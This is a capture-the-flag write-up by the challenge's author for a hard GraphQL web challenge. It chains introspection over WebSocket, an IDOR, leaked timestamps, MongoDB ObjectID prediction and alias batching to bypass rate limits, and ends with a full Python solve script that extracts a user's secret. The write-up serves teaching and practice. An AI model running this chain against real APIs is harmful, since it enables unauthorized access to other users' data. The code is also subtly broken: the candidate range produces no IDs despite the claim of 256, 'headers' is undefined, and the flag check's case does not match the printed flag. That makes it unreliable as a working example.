# Gear5 CTF Challenge Writeup

**Challenge:** Gear5  
**Event:** Cybears CTF  
**Category:** Web
**Difficulty:** Hard  

This was a challenge that I created, which required chaining multiple GraphQL vulnerabilities to exfiltrate sensitive data from a MongoDB-backed API. The exploit chain combines GraphQL introspection, IDOR, MongoDB ObjectID prediction, and rate limit bypass through alias abuse.

---

## TL;DR

This challenge chains four vulnerabilities to retrieve the flag:
1. **GraphQL Introspection**, Discover hidden queries and schema structure
2. **Information Disclosure**, `allUsersTimestamps` leaks user creation timestamps
3. **MongoDB ObjectID Prediction**, Predictable ID structure allows ID generation
4. **Rate Limit Bypass**, GraphQL aliases batch multiple queries as a single request to bypass rate limiting on `userSensitive` query

---

The descripton said you need gear5 to solve it 
lets get that 
![luffy](./luffy.gif)


---

## Overview

**Gear5** is a GraphQL API with the following characteristics:
- GraphQL endpoint (HTTP) with introspection **disabled**
- WebSocket endpoint for real time communication
- MongoDB backend using ObjectIDs as user identifiers
- User authentication system with registration/login
- Rate limiting on sensitive queries
- Hidden `userSensitive` query that returns user secrets/flags

---

## Finding the Entry Point

When I first accessed the challenge, I was presented with a GraphQL endpoint. As with any GraphQL target, the first step is always introspection, if it's enabled, it's a goldmine of information.

I tried sending an introspection query to the HTTP endpoint, but it was blocked, introspection was disabled! This is a common security measure in production GraphQL APIs.

However, I noticed the application also had a WebSocket endpoint. Looking at the network traffic, I could see WebSocket messages being exchanged. The responses suggested this was also using GraphQL for communication.

This was interesting, sometimes developers forget to apply the same security controls across all endpoints. Let me try introspection via WebSocket.

### Discovery #1: GraphQL Introspection via WebSocket

I connected to the WebSocket endpoint and sent an introspection query to map out the entire schema:

```python
import websocket
import json

WS_URL = "ws://localhost:4000"

ws = websocket.WebSocket()
ws.connect(WS_URL)

introspection_query = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
      }
    }
  }
}
"""

ws.send(json.dumps({
    "id": "1",
    "type": "graphql",
    "query": introspection_query,
    "variables": {}
}))
```

<!-- TODO: Add GIF showing introspection query being sent and response -->

The introspection revealed several interesting queries:
- `allUsersTimestamps`, Returns creation timestamps for all users (suspicious!)
- `userSensitive(id: String!)`, Returns sensitive data for a specific user (target!)
- Standard mutations for user registration and authentication

The presence of `allUsersTimestamps` and `userSensitive` immediately raised red flags. Why would an API expose user creation times? And why would there be a "sensitive" query?

### Discovery #2: The IDOR Vulnerability

To test if I could access other users' data, I created a second account and noted its user ID. Then I tested the `userSensitive` query with that second user's ID:

```graphql
query {
  userSensitive(id: "691c3c380ce6320d62cdcb56") {
    secret
  }
}
```

It worked! No authorization validation. Classic IDOR, I could query any user's sensitive data if I knew their ID, even while authenticated as a different user.

But there was a problem: I didn't know the target user's ID. And when I tried querying multiple IDs rapidly, I hit rate limiting.

![gear5_2](./gear5_2.gif)

That's when I remembered something crucial about GraphQL...

### Discovery #3: Bypassing Rate Limits with GraphQL Aliases

GraphQL has a powerful feature called aliases that allows you to query the same field multiple times in a single request with different arguments. Here's the key insight: from the server's perspective, this is **one request**, but GraphQL processes multiple queries inside it!

```graphql
query {
  user1: userSensitive(id: "691c3c380ce6320d62cdcb2d") {
    secret
  }
  user2: userSensitive(id: "691c3c380ce6320d62cdcb2e") {
    secret
  }
  user3: userSensitive(id: "691c3c380ce6320d62cdcb2f") {
    secret
  }
  # ... many more queries with different aliases
}
```

The rate limiter only sees one request, but GraphQL executes all the queries! This could be my way around the rate limiting problem, but I still needed to know which IDs to query.

**Note:** This isn't just a CTF trick, I've actually encountered this vulnerability on real-world GraphQL APIs during bug bounty hunting. Many production APIs implement rate limiting that only counts HTTP requests, completely missing that a single GraphQL request can contain hundreds of aliased queries. It's a subtle technique that developers often overlook.

**An Other Note XD:** Some people didnt do that they just used other endpoints like sendMessages etc to leak email of luffy since there is no rate limiting there

### Discovery #4: Understanding MongoDB ObjectIDs

Looking at the user IDs returned by the API, I recognized the pattern, these were MongoDB ObjectIDs. I knew these had a predictable structure that could potentially be exploited.

According to the [MongoDB documentation](https://www.mongodb.com/docs/manual/reference/method/ObjectId/), a 12-byte ObjectID consists of three components:

```
+----------------+-------------+-----------+
| Timestamp (4B) | Machine ID (5B) | Counter (3B) |
+----------------+-------------+-----------+
```

**Breaking down the structure:**

1. **Timestamp (4 bytes)**: Unix timestamp in seconds representing when the ObjectID was created
2. **Machine ID (5 bytes)**: A random value generated once per process. This stays the same for all ObjectIDs created by the same server process
3. **Counter (3 bytes)**: An incrementing counter that starts at a random value and increases sequentially for each new ObjectID

Let's look at a real example: `691c3c380ce6320d62cdcb56`

```
691c3c38      0ce6320d62      cdcb56
(Timestamp)   (Machine ID)    (Counter)
```

- `691c3c38` → Timestamp when user was created
- `0ce6320d62` → Random machine/process identifier
- `cdcb56` → Counter value (0xcdcb56 in hex = 13,487,958 in decimal)

**The key insight:** The machine ID remains constant across all users created on the same server instance, and the counter increments predictably. This means if I know:
- When a target user was created (timestamp)
- The machine ID (extracted from any user on the same server)
- An approximate counter range (from a recently created user)

I could generate a small list of candidate ObjectIDs that likely includes the target user's ID! Combined with GraphQL aliases, I could query all candidates in a single request, completely bypassing the rate limiter.

### Discovery #5: Leaking Timestamps

This is where `allUsersTimestamps` became crucial:

```python
timestamp_query = {
    "query": """
    query {
      allUsersTimestamps {
        createdAt
      }
    }
    """
}

response = requests.post(GRAPHQL_URL, headers=headers, data=json.dumps(timestamp_query))
target_timestamps = response.json()["data"]["allUsersTimestamps"]
```

<!-- TODO: Add GIF showing timestamp extraction -->

This query leaked the creation timestamp of every user in the database, including the target user with the flag!

Now I had the timestamp component. I just needed the random component and counter range.

### Discovery #6: Extracting ObjectID Components

To learn the random and counter components, I registered my own user account:

```python
new_user = {
    "username": "attacker_user",
    "email": "attacker@example.com",
    "password": "password123",
    "secret": "my_secret"
}

register_payload = {
    "query": """
      mutation Register($username: String!, $email: String!, $password: String!, $secret: String!) {
        register(username: $username, email: $email, password: $password, secret: $secret) {
          token
          user {
            id
            username
            email
          }
        }
      }
    """,
    "variables": new_user
}

response = requests.post(GRAPHQL_URL, headers=headers, data=json.dumps(register_payload))
user_id = response.json()["data"]["register"]["user"]["id"]
print(f"My user ID: {user_id}")
```

From my user ID, I extracted:

```python
tmp_id_part = user_id[8:18]  # Middle 5 bytes (random component)
counter = int(user_id[-6:], 16)  # Last 3 bytes (counter)
```

<!-- TODO: Add GIF showing user registration and ID extraction -->

The key insight: the random component (machine/process identifier) stays the same across all users created on the same server instance. And the counter increments sequentially. So if my user has counter `0xcdcb5d`, the target user created slightly earlier might have counter `0xcdcb56` or somewhere in that range!

### Discovery #7: Generating Candidate ObjectIDs

Now I could generate candidate ObjectIDs for the target user:

```python
# Convert target timestamp to hex
created_at_timestamp_ms = int(target_user["createdAt"])
time_hex = int(created_at_timestamp_ms / 1000).to_bytes(4, "big").hex()

# Generate range of possible ObjectIDs
# We try 256 different counter values before our registered user
uuids = [
    f"{time_hex}{tmp_id_part}{i:06x}" 
    for i in range(counter, 0x100, counter)
]
```

This gave me a list of 256 possible ObjectIDs. Statistically, one of these was very likely to be the target user's ID!

Now I had everything I needed: 256 candidate IDs and a way to query them all at once using GraphQL aliases without triggering the rate limiter. Time to put it all together!

### Discovery #8: Building the Aliased Query

I generated the full query with all 256 candidate IDs using aliases:

```python
query_lines = [
    f"u{uuid}: userSensitive(id:\"{uuid}\") {{secret}}"
    for uuid in uuids
]

graphql_query = "query {" + "\n".join(query_lines) + "}"
```

The final query looked something like this (shortened for readability):

```graphql
query {
  u691c3c380ce6320d62cdcb2d: userSensitive(id: "691c3c380ce6320d62cdcb2d") {
    secret
  }
  u691c3c380ce6320d62cdcb2e: userSensitive(id: "691c3c380ce6320d62cdcb2e") {
    secret
  }
  # ... 254 more aliased queries ...
}
```

<!-- TODO: Add screenshot showing the massive query structure -->

---

## Putting It All Together

The complete attack chain:

1. **Introspection** reveals `allUsersTimestamps` and `userSensitive` queries
2. **Extract timestamps** from `allUsersTimestamps` to get target user creation time
3. **Register a user** to learn the random component and counter range
4. **Generate 256 candidate ObjectIDs** using target timestamp + extracted components
5. **Build aliased GraphQL query** with all 256 IDs to bypass rate limiting
6. **Send single request** that queries all candidates simultaneously
7. **Extract the flag** from the successful response

<!-- TODO: Add GIF showing the final exploit running -->

### The Complete Exploit Script

Here's the core of `solve.py`:

```python
from datetime import datetime
import requests
import json
import uuid

GRAPHQL_URL = "https://gear5-06dffe5c48ac6a2d.ctf.clawtheflag.com/graphql"

# Step 1: Get timestamps
timestamp_query = {"query": "query { allUsersTimestamps { createdAt } }"}
response = requests.post(GRAPHQL_URL, headers=headers, data=json.dumps(timestamp_query))
target_timestamps = response.json()["data"]["allUsersTimestamps"]

for ts in target_timestamps:
    target_user = {"createdAt": ts["createdAt"]}
    created_at_timestamp_ms = int(target_user["createdAt"])
    time_hex = int(created_at_timestamp_ms / 1000).to_bytes(4, "big").hex()
    
    # Step 2: Register user to extract components
    new_user = {
        "username": "attacker_" + uuid.uuid4().hex[:6],
        "email": "attacker_" + uuid.uuid4().hex[:6] + "@example.com",
        "password": "password123",
        "secret": "secret123"
    }
    
    register_payload = {
        "query": """
            mutation Register($username: String!, $email: String!, $password: String!, $secret: String!) {
              register(username: $username, email: $email, password: $password, secret: $secret) {
                user { id }
              }
            }
        """,
        "variables": new_user
    }
    
    response = requests.post(GRAPHQL_URL, headers=headers, data=json.dumps(register_payload))
    user_id = response.json()["data"]["register"]["user"]["id"]
    
    # Step 3: Extract components
    tmp_id_part = user_id[8:18]
    counter = int(user_id[-6:], 16)
    
    # Step 4: Generate candidates
    uuids = [f"{time_hex}{tmp_id_part}{i:06x}" for i in range(counter, 0x100, counter)]
    
    # Step 5: Build aliased query
    query_lines = [f"u{uuid}: userSensitive(id:\"{uuid}\") {{secret}}" for uuid in uuids]
    graphql_query = "query {" + "\n".join(query_lines) + "}"
    
    # Step 6: Send request
    payload = {"query": graphql_query}
    response = requests.post(GRAPHQL_URL, headers=headers, data=json.dumps(payload))
    
    print(f"Status code: {response.status_code}")


    result = response.json().get("data", {})

    for key, value in result.items():
        if value and 'cybears{' in value.get("secret", ""):
            print(f"Found flag in {key}: {value['secret']}")
            exit(0)

```

## After running the exploit, the response came back with the flag!

Cybears{now_you_are_a_hacker_with_gear_5_powers_no_one_can_stop_you}

## and by that you officially have gear5 powers

![gear5](./gear5.gif)

---

